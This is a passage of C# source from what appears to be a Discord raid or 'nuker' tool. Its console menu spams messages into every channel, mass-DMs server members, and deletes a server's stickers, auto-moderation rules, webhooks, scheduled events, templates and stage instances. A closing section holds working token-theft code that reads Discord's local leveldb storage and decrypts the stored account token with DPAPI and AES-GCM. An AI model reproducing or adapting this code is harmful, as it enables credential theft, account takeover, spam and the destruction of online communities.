                        table2.Config = TableConfiguration.Unicode();
                        Console.Write(table2.ToString());
                        Console.WriteLine();
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        string choice = Console.ReadLine();
                        if (choice == "1")
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Messages count: ");
                            string count = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            int total = 0;
                            for (int i = 0; i < int.Parse(count); i++)
                            {
                                try
                                {
                                    total++;
                                    Server.MsgInEveryChannel(token, guildid, msg);
                                }
                                catch { }
                            }
                        }
                        else
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Server.MsgInEveryChannel(token, guildid, msg);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(2000);
                    }
                    DoneMethod2();
                    break;
                case 14:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteStickers(token, guildid);
                    DoneMethod2();
                    break;
                case 15:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Message: ");
                        string msgs = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Server.ServerDM(token, msgs);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(2000);
                    }
                    break;
                case 16:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteAutoModerationRules(token, guildid);
                    DoneMethod2();
                    break;
                case 17:
                    Console.Clear();
                    WriteLogo();
                    Server.CreateInvite(token, guildid);
                    DoneMethod2();
                    break;
                case 18:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteGuildScheduledEvents(token, guildid);
                    DoneMethod2();
                    break;
                case 19:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteGuildTemplate(token, guildid);
                    DoneMethod2();
                    break;
                case 20:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteStageInstances(token, guildid);
                    DoneMethod2();
                    break;
                case 21:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteWebhooks(token, guildid);
                    DoneMethod2();
                    break;
                case 22:
                    Console.Clear();
                    WriteLogo();
                    Options();
                    break;
                case 23:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Get Token
        static string GetToken()
        {
            string token = "";

            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match = EncryptedRegex.Match(contents);
                if (match.Success)
                {
                    token = DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                }
            }

            return token;
        }

        static byte[] DecryptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecryptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        #endregion
    }
}
